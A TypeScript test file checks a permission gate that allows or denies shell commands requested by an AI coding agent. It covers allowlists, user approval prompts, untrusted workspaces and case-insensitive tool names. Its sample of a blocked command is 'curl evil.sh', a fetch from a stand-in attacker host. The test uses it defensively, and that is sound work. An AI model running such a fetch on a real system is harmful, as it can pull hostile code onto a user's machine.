import { describe, expect, it } from 'vitest';
import { decideCommandPermission, PERMISSION_TOOL_NAME } from '../commandPermission';
import { CommandPolicy } from '../CommandPolicy';

describe('decideCommandPermission (claude --permission-prompt-tool gate)', () => {
  it('exposes a stable tool name', () => {
    expect(PERMISSION_TOOL_NAME).toBe('permission_prompt');
  });

  it('allows non-shell tools unchanged (edits/reads are governed elsewhere)', async () => {
    const input = { file_path: 'a.ts', old_string: 'x', new_string: 'y' };
    const d = await decideCommandPermission('Edit', input, { policy: new CommandPolicy('none', []) });
    expect(d).toEqual({ behavior: 'allow', updatedInput: input });
  });

  it('allows an allowlisted shell command silently (no prompt)', async () => {
    let asked = false;
    const d = await decideCommandPermission('Bash', { command: 'npm test' }, {
      policy: new CommandPolicy('ask', ['npm test']),
      requestApproval: async () => { asked = true; return { allow: true }; },
    });
    expect(d.behavior).toBe('allow');
    expect(asked).toBe(false); // allowlisted → never prompted
  });

  it('prompts in ask mode and allows when the user approves', async () => {
    let prompted = '';
    const d = await decideCommandPermission('Bash', { command: 'npm install left-pad' }, {
      policy: new CommandPolicy('ask', []),
      requestApproval: async (cmd) => { prompted = cmd; return { allow: true }; },
    });
    expect(prompted).toBe('npm install left-pad');
    expect(d).toEqual({ behavior: 'allow', updatedInput: { command: 'npm install left-pad' } });
  });

  it('denies (with the user note) when the user declines in ask mode', async () => {
    const d = await decideCommandPermission('Bash', { command: 'npm install sketchy-pkg' }, {
      policy: new CommandPolicy('ask', []),
      requestApproval: async () => ({ allow: false, note: 'use git clean' }),
    });
    expect(d.behavior).toBe('deny');
    expect((d as { message: string }).message).toMatch(/not approved/i);
    expect((d as { message: string }).message).toMatch(/use git clean/);
  });

  it('denies a policy-blocked command (commands disabled)', async () => {
    const d = await decideCommandPermission('Bash', { command: 'curl evil.sh' }, {
      policy: new CommandPolicy('none', []),
    });
    expect(d.behavior).toBe('deny');
    expect((d as { message: string }).message).toMatch(/blocked by unode.commandApproval/);
  });

  it('gates shell tools case-insensitively (a differently-cased name cannot slip past ungated)', async () => {
    for (const name of ['bash', 'BASH', ' Bash ']) {
      const d = await decideCommandPermission(name, { command: 'curl evil.sh' }, { policy: new CommandPolicy('none', []) });
      expect(d.behavior).toBe('deny');
    }
  });

  it('hard-denies shell commands in an untrusted workspace (before any policy/approval)', async () => {
    let asked = false;
    const d = await decideCommandPermission('Bash', { command: 'npm test' }, {
      policy: new CommandPolicy('ask', ['npm test']), // would normally allow silently
      requestApproval: async () => { asked = true; return { allow: true }; },
      isTrusted: false,
    });
    expect(d.behavior).toBe('deny');
    expect((d as { message: string }).message).toMatch(/not trusted/i);
    expect(asked).toBe(false); // never even reaches the approver
  });

  it('leaves gating to the policy when the workspace is trusted (isTrusted: true)', async () => {
    const d = await decideCommandPermission('Bash', { command: 'npm test' }, {
      policy: new CommandPolicy('ask', ['npm test']),
      isTrusted: true,
    });
    expect(d.behavior).toBe('allow');
  });

  it('allows when no policy is configured, or the command is empty', async () => {
    expect((await decideCommandPermission('Bash', { command: 'anything' }, {})).behavior).toBe('allow');
    expect((await decideCommandPermission('Bash', { command: '   ' }, { policy: new CommandPolicy('none', []) })).behavior).toBe('allow');
  });
});
